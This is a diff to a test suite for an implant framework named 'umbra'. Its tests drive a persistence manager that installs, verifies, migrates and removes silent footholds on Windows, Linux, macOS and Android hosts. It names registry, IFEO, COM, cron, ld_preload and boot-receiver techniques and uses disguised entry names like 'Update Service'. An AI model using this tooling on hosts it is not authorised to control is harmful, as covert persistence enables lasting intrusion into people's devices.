@@ -71,6 +71,12 @@ def test_upk_rejects_non_canonical(name):
         upk.decode_exact(bytes.fromhex(VECTORS["rejects"][name]))
 
 
+def read_text(relative: str) -> str:
+    """Read one file of the repository, for the static checks."""
+    with open(os.path.join(ROOT, relative), encoding="utf-8") as fh:
+        return fh.read()
+
+
 def test_upk_map_keys_are_sorted_and_unique():
     encoded = upk.encode({"z": 1, "a": 2, "m": 3})
     decoded = upk.decode_exact(encoded)
@@ -3710,3 +3716,321 @@ def test_the_state_file_keeps_binary_task_arguments():
     assert "encodeArgs" in store and "decodeArgs" in store
     assert "c.Args = encodeArgs(c.Args)" in store
     assert "t.Args = decodeArgs(t.Args)" in store
+
+
+def test_the_persistence_lifecycle_runs_on_the_agent():
+    """The whole lifecycle: install, list, verify, health, remove."""
+    sys.path.insert(0, os.path.join(ROOT, "tools"))
+    from mock_server import FakeAgent, MockServer  # noqa: WPS433
+    from umbra_cli.client import OperatorClient  # noqa: WPS433
+
+    token = b"persist-token-0123456789abc"
+    server = MockServer(AGENT_PSK, {"alice": token})
+    server.start()
+    agent = FakeAgent(server.address, AGENT_PSK, "agent-persist", interval=0.2)
+    agent.start()
+
+    client = OperatorClient(server.address, token.decode(), "alice")
+    try:
+        client.connect()
+        deadline = time.time() + 5
+        while time.time() < deadline and not client.agents():
+            time.sleep(0.05)
+        assert client.agents()
+
+        # Install: the manager picks a technique and reports the entries.
+        task_id = client.submit("agent-persist", "persist", {"method": "auto"})
+        task = client.wait_for_result(task_id, timeout=10)
+        assert task["state"] == "done", task
+        entries = (task.get("meta") or {}).get("persist") or []
+        assert entries, task
+        assert entries[0]["technique"]
+        assert entries[0]["state"] == "installed"
+
+        # List: the same entries come back.
+        task = client.wait_for_result(
+            client.submit("agent-persist", "persist.list", {}), timeout=10)
+        assert task["state"] == "done", task
+        listed = (task.get("meta") or {}).get("persist") or []
+        assert len(listed) == len(entries)
+
+        # Verify: every entry is still there.
+        task = client.wait_for_result(
+            client.submit("agent-persist", "persist.verify", {}), timeout=10)
+        assert task["state"] == "done", task
+        assert (task.get("meta") or {}).get("persist_broken") == 0
+
+        # Health: one verdict for the host.
+        task = client.wait_for_result(
+            client.submit("agent-persist", "persist.health", {}), timeout=10)
+        assert task["state"] == "done", task
+        assert "covered" in (task.get("out") or b"").decode()
+
+        # Remove: the entries are gone.
+        task = client.wait_for_result(
+            client.submit("agent-persist", "unpersist", {"method": "all"}), timeout=10)
+        assert task["state"] == "done", task
+        assert not ((task.get("meta") or {}).get("persist") or [])
+    finally:
+        client.close()
+        agent.stop()
+        server.stop()
+
+
+def test_the_server_keeps_the_persistence_record():
+    """What the beacon reported is what the inventory shows."""
+    sys.path.insert(0, os.path.join(ROOT, "tools"))
+    from mock_server import FakeAgent, MockServer  # noqa: WPS433
+    from umbra_cli.client import OperatorClient  # noqa: WPS433
+
+    token = b"persist-record-token-0123456789"
+    server = MockServer(AGENT_PSK, {"alice": token})
+    server.start()
+    agent = FakeAgent(server.address, AGENT_PSK, "agent-keep", interval=0.2)
+    agent.start()
+
+    client = OperatorClient(server.address, token.decode(), "alice")
+    try:
+        client.connect()
+        deadline = time.time() + 5
+        while time.time() < deadline and not client.agents():
+            time.sleep(0.05)
+        assert client.agents()
+
+        # Nothing is installed yet, so the filter finds nothing.
+        assert client.agents(persisted="yes") == []
+
+        client.wait_for_result(
+            client.submit("agent-keep", "persist", {"method": "auto"}), timeout=10)
+
+        # The record is on the agent now.
+        deadline = time.time() + 5
+        rows = []
+        while time.time() < deadline:
+            rows = client.agents()
+            if rows and rows[0].get("persist"):
+                break
+            time.sleep(0.05)
+        assert rows[0].get("persist"), rows
+        assert rows[0]["persist"][0]["technique"]
+
+        # And the filter finds the host.
+        found = client.agents(persisted="yes")
+        assert [a["id"] for a in found] == ["agent-keep"]
+    finally:
+        client.close()
+        agent.stop()
+        server.stop()
+
+
+def test_a_broken_entry_is_reported():
+    """An entry that was removed behind the operator's back is broken."""
+    sys.path.insert(0, os.path.join(ROOT, "tools"))
+    from mock_server import FakeAgent, MockServer  # noqa: WPS433
+    from umbra_cli.client import OperatorClient  # noqa: WPS433
+
+    token = b"persist-broken-token-0123456789"
+    server = MockServer(AGENT_PSK, {"alice": token})
+    server.start()
+    agent = FakeAgent(server.address, AGENT_PSK, "agent-broken", interval=0.2)
+    agent.start()
+
+    client = OperatorClient(server.address, token.decode(), "alice")
+    try:
+        client.connect()
+        deadline = time.time() + 5
+        while time.time() < deadline and not client.agents():
+            time.sleep(0.05)
+        assert client.agents()
+
+        task = client.wait_for_result(
+            client.submit("agent-broken", "persist", {"method": "auto"}), timeout=10)
+        technique = ((task.get("meta") or {}).get("persist") or [{}])[0].get("technique")
+        assert technique
+
+        # The entry is gone behind the operator's back.
+        task = client.wait_for_result(
+            client.submit("agent-broken", "persist.verify", {"break": technique}),
+            timeout=10)
+        assert task["state"] == "done", task
+        assert (task.get("meta") or {}).get("persist_broken") == 1
+
+        # The health verdict is degraded: one entry, and it is broken.
+        task = client.wait_for_result(
+            client.submit("agent-broken", "persist.health", {}), timeout=10)
+        assert "broken" in (task.get("out") or b"").decode()
+    finally:
+        client.close()
+        agent.stop()
+        server.stop()
+
+
+def test_the_console_knows_the_persistence_commands():
+    """The parser and the client know every persistence command."""
+    sys.path.insert(0, os.path.join(ROOT, "operator"))
+    from umbra_cli import cli  # noqa: WPS433
+
+    parser = cli.build_parser()
+    parsed = parser.parse_args(["persist", "web-01", "--method", "registry.run",
+                                "--name", "Update Service"])
+    assert parsed.cmd == "persist"
+    assert parsed.method == "registry.run"
+    assert parsed.name == "Update Service"
+    # The install is silent unless the operator asks for the noise.
+    assert parsed.silent is True
+    assert parsed.verify is True
+
+    for command in ("persist-list", "persist-verify", "persist-health",
+                    "persist-report"):
+        assert parser.parse_args([command] + (["web-01"] if command != "persist-report" else [])).cmd == command
+
+    migrate = parser.parse_args(["persist-migrate", "web-01", "--from",
+                                  "registry.run", "--to", "schtasks"])
+    assert migrate.source == "registry.run" and migrate.target == "schtasks"
+
+    # The fleet report is a client method, not a task: the server already
+    # keeps the record.
+    from umbra_cli.client import OperatorClient  # noqa: WPS433
+    assert hasattr(OperatorClient, "persistence_report")
+
+
+def test_the_persistence_report_covers_the_fleet():
+    """The report says what is installed where, and what is broken."""
+    sys.path.insert(0, os.path.join(ROOT, "tools"))
+    from mock_server import FakeAgent, MockServer  # noqa: WPS433
+    from umbra_cli.client import OperatorClient  # noqa: WPS433
+
+    token = b"persist-report-token-01234567"
+    server = MockServer(AGENT_PSK, {"alice": token})
+    server.start()
+    agent = FakeAgent(server.address, AGENT_PSK, "agent-fleet", interval=0.2)
+    agent.start()
+
+    client = OperatorClient(server.address, token.decode(), "alice")
+    try:
+        client.connect()
+        deadline = time.time() + 5
+        while time.time() < deadline and not client.agents():
+            time.sleep(0.05)
+        assert client.agents()
+
+        # Before the install the host has no persistence.
+        rows = client.persistence_report()
+        assert rows and rows[0]["state"] == "none"
+
+        client.wait_for_result(
+            client.submit("agent-fleet", "persist", {"method": "auto"}), timeout=10)
+        deadline = time.time() + 5
+        rows = []
+        while time.time() < deadline:
+            rows = client.persistence_report()
+            if rows and rows[0]["state"] == "covered":
+                break
+            time.sleep(0.05)
+        assert rows[0]["state"] == "covered", rows
+        assert rows[0]["entries"] == 1
+        assert rows[0]["methods"]
+    finally:
+        client.close()
+        agent.stop()
+        server.stop()
+
+
+def test_the_rust_beacon_owns_the_persistence_catalogue():
+    """The beacon has a catalogue, a selection engine and a state file."""
+    source = read_text("implant/rust/src/persist.rs")
+    # The catalogue covers the platforms, and the ids are the ones the
+    # documentation names.
+    for technique in ("registry.run", "registry.runonce", "registry.winlogon",
+                       "registry.ifeo", "registry.appinit", "registry.com",
+                       "schtasks", "taskxml", "service", "startup", "bcdedit",
+                       "systemd.user", "systemd.system", "systemd.timer",
+                       "cron.user", "cron.d", "rc.local", "init.d", "profile",
+                       "ld_preload", "xdg_autostart", "at", "launchd.agent",
+                       "launchd.daemon", "loginitem", "shell_rc"):
+        assert f'id: "{technique}"' in source, technique
+    # The state file is the canonical encoding, so the beacon needs no
+    # serialisation library for it.
+    assert "upk::encode" in source and "upk::decode_exact" in source
+    # The manager verifies what it installs, and it migrates without a gap.
+    assert "fn verify_technique" in source
+    assert "fn migrate" in source
+    # The module is public, so the task dispatcher can reach it.
+    assert "pub mod persist;" in read_text("implant/rust/src/lib.rs")
+
+
+def test_the_task_dispatcher_runs_the_persistence_kinds():
+    """Every persistence kind is a task the beacon understands."""
+    source = read_text("implant/rust/src/task.rs")
+    for kind in ("persist.list", "persist.verify", "persist.migrate",
+                 "persist.health"):
+        assert f'"{kind}"' in source, kind
+    # And the beacon says it can run them.
+    assert '"persist.list"' in source and '"persist.health"' in source
+    # The result carries the entries, so the server can keep the record.
+    assert '"persist"' in source and "persist_total" in source
+
+
+def test_the_phone_runs_the_persistence_lifecycle():
+    """The implant on a phone has the same lifecycle, with its own tools."""
+    runner = read_text("implant/android/app/src/main/java/io/umbra/beacon/TaskRunner.kt")
+    for kind in ("persist.list", "persist.verify", "persist.migrate",
+                 "persist.health"):
+        assert f'"{kind}"' in runner, kind
+    assert "Persistence.install" in runner
+    manager = read_text("implant/android/app/src/main/java/io/umbra/beacon/Persistence.kt")
+    assert "boot_receiver" in manager and "foreground_service" in manager
+    assert "alarm" in manager
+    # The state is the canonical encoding, like on the desktop.
+    assert "Upk.encode" in manager and "Upk.decode" in manager
+    # The boot receiver is registered, so the implant comes back.
+    manifest = read_text("implant/android/app/src/main/AndroidManifest.xml")
+    assert "RECEIVE_BOOT_COMPLETED" in manifest
+    assert ".BootReceiver" in manifest
+    assert "SCHEDULE_EXACT_ALARM" in manifest
+
+
+def test_the_server_keeps_the_persistence_of_every_host():
+    """The server stores the entries and raises the alert."""
+    store = read_text("server/internal/store/store.go")
+    assert "type PersistEntry struct" in store
+    assert "func (s *Store) SetPersistence" in store
+    assert "Persist []PersistEntry" in store
+
+    hub = read_text("server/internal/hub/hub.go")
+    assert '"persist.updated"' in hub
+    assert '"persist.broken"' in hub
+    assert "func persistEntries" in hub
+    # The inventory shows the entries and can be filtered by them.
+    assert '"persist": a.Persist' in hub
+    assert "Persisted string" in hub
+
+    operator = read_text("server/internal/link/operator.go")
+    assert '"persist": a.Persist' in operator
+    assert 'm["persisted"]' in operator
+
+
+def test_the_documentation_describes_the_persistence():
+    """The runbook, the protocol and the readme all mention it."""
+    protocol = read_text("docs/PROTOCOL.md")
+    for kind in ("persist.list", "persist.verify", "persist.migrate",
+                 "persist.health"):
+        assert f"| `{kind}` |" in protocol, kind
+    assert "7.2g The persistence manager" in protocol
+    operations = read_text("docs/OPERATIONS.md")
+    assert "umbra persist-report" in operations
+    assert "umbra persist-migrate" in operations
+    assert "registry.run" in operations
+    readme = read_text("README.md")
+    assert "Staying installed" in readme
+
+
+def test_the_consistency_checker_knows_the_techniques():
+    """The checker learns the technique ids, so the prose stays honest."""
+    sys.path.insert(0, os.path.join(ROOT, "tools"))
+    import check_consistency  # noqa: WPS433
+
+    techniques = check_consistency.rust_persist_techniques()
+    assert "registry.run" in techniques
+    assert "systemd.user" in techniques
+    assert "boot_receiver" not in techniques  # that one is the phone's
